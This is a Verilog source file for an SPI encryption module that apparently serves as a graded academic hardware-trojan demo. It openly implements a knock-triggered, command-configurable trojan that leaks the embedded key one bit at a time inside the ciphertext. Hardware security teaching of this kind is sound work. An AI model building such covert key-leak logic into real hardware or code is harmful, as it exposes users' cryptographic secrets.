// =====================================================================
// spi_crypto_top -- TROJANED (ADVANCED: command-configurable covert
// serial key-exfiltration).  Written plainly/readably on purpose
// (graded academic demo; NOT obfuscated).
//
//  STAGE 1 - UNLOCK (sequential knock):
//     arm the covert channel only after KN1 -> KN2 -> KN3 arrive in order
//     on consecutive encrypt operations.
//  STAGE 2 - CODED INSTRUCTION:
//     the ENCRYPT word presented immediately AFTER the knock is a command,
//     not data:
//        cmd[4:0] = leak_pos  (which ciphertext bit carries the leaked key bit)
//        cmd[9:5] = cadence-1 (leak once every 'cadence' encrypt operations)
//  STAGE 3 - COVERT SERIAL LEAK:
//     on each selected encrypt operation, the normal ciphertext is produced
//     but ONE bit (at leak_pos) is overwritten with the next key bit. Over
//     32 leak operations the whole key is exfiltrated, one bit at a time,
//     inside otherwise-valid-looking ciphertext.
// =====================================================================
module spi_crypto_top (
    input  wire SCK, RST_N, MOSI,
    output wire MISO,
    input  wire NORM_CS_N, START, ENC_DEC,
    output wire BUSY, ICE_LED
);
    localparam [31:0] KEY = 32'hA5A5A5A5;              // embedded key (target of exfiltration)
    localparam [31:0] KN1 = 32'h3C8F17A2,
                      KN2 = 32'h9B216E4D,
                      KN3 = 32'hF50AC3B9;
    localparam [1:0] IDLE=2'd0, R1=2'd1, R2=2'd2, R3=2'd3;

    // ---- normal cipher state ----
    reg  [31:0] shreg, text_reg;
    reg  [1:0]  state;
    reg         busy, busy_d;

    // ---- TROJAN state (clearly named) ----
    reg  [1:0]  knock;        // knock progress 0->1->2
    reg         cmd_wait;     // knock done, next encrypt op is the command word
    reg         armed;        // covert channel active
    reg  [4:0]  leak_pos;     // configured: which ciphertext bit carries the leak
    reg  [4:0]  cad_m1;       // configured: cadence-1
    reg  [4:0]  cad_cnt;      // cadence countdown
    reg  [4:0]  key_idx;      // which key bit to leak next
    reg         leak_this;    // this operation leaks a bit

    assign BUSY=busy; assign ICE_LED=busy; assign MISO=shreg[31];

    // ---- cipher round datapath (unchanged baseline) ----
    wire [31:0] rin  = (state==IDLE) ? shreg : text_reg;
    wire [31:0] rotr = {rin[7:0], rin[31:8]};
    wire [7:0] e3,e2,e1,e0;
    crypt_sbox_inv ue3(.a(rotr[31:24]),.y(e3)); crypt_sbox_inv ue2(.a(rotr[23:16]),.y(e2));
    crypt_sbox_inv ue1(.a(rotr[15:8]), .y(e1)); crypt_sbox_inv ue0(.a(rotr[7:0]), .y(e0));
    wire [31:0] enc_round = {e3,e2,e1,e0} ^ KEY;
    wire [31:0] dk = rin ^ KEY;
    wire [7:0] d3,d2,d1,d0;
    crypt_sbox ud3(.a(dk[31:24]),.y(d3)); crypt_sbox ud2(.a(dk[23:16]),.y(d2));
    crypt_sbox ud1(.a(dk[15:8]), .y(d1)); crypt_sbox ud0(.a(dk[7:0]), .y(d0));
    wire [31:0] sub_d = {d3,d2,d1,d0};
    wire [31:0] dec_round = {sub_d[23:0], sub_d[31:24]};
    wire [31:0] round_out = ENC_DEC ? dec_round : enc_round;

    // ---- TROJAN payload: overwrite ONE ciphertext bit with the current key bit ----
    wire        key_bit = KEY[key_idx];
    wire        flip    = round_out[leak_pos] ^ key_bit;     // 1 if that bit must change
    wire [31:0] leaked  = round_out ^ (flip ? (32'd1 << leak_pos) : 32'd0);
    wire [31:0] load_val = leak_this ? leaked : round_out;

    always @(posedge SCK) begin
        busy_d <= busy;
        if (!RST_N) begin
            shreg<=0; text_reg<=0; state<=IDLE; busy<=0; busy_d<=0;
            knock<=0; cmd_wait<=0; armed<=0; leak_pos<=0; cad_m1<=0; cad_cnt<=0;
            key_idx<=0; leak_this<=0;
        end else begin
            case (state)
                IDLE: if (START) begin
                          text_reg <= round_out; state <= R1; busy <= 1'b1;
                          leak_this <= 1'b0;                         // default: no leak this op
                          if (!ENC_DEC) begin
                              if (cmd_wait) begin
                                  // ---- STAGE 2: capture the coded instruction ----
                                  leak_pos <= shreg[4:0];
                                  cad_m1   <= shreg[9:5];
                                  cad_cnt  <= 5'd0;
                                  key_idx  <= 5'd0;
                                  armed    <= 1'b1;
                                  cmd_wait <= 1'b0;
                              end else if (armed) begin
                                  // ---- STAGE 3: leak on cadence ----
                                  if (cad_cnt == 5'd0) begin
                                      leak_this <= 1'b1;             // leak this op
                                      cad_cnt   <= cad_m1;           // reload cadence
                                  end else begin
                                      cad_cnt <= cad_cnt - 5'd1;
                                  end
                              end else begin
                                  // ---- STAGE 1: advance the unlock knock ----
                                  case (knock)
                                    2'd0: knock <= (shreg==KN1) ? 2'd1 : 2'd0;
                                    2'd1: knock <= (shreg==KN2) ? 2'd2 : ((shreg==KN1)?2'd1:2'd0);
                                    2'd2: if (shreg==KN3) begin knock<=2'd0; cmd_wait<=1'b1; end
                                          else            knock <= (shreg==KN1)?2'd1:2'd0;
                                  endcase
                              end
                          end
                      end else busy <= 1'b0;
                R1: begin text_reg <= round_out; state <= R2; end
                R2: begin text_reg <= round_out; state <= R3; end
                R3: begin text_reg <= round_out; state <= IDLE; busy <= 1'b0;
                        if (leak_this) key_idx <= key_idx + 5'd1;    // advance to next key bit
                    end
            endcase
            if (state==R3)       shreg <= load_val;
            else if (!NORM_CS_N) shreg <= {shreg[30:0], MOSI};
        end
    end
endmodule
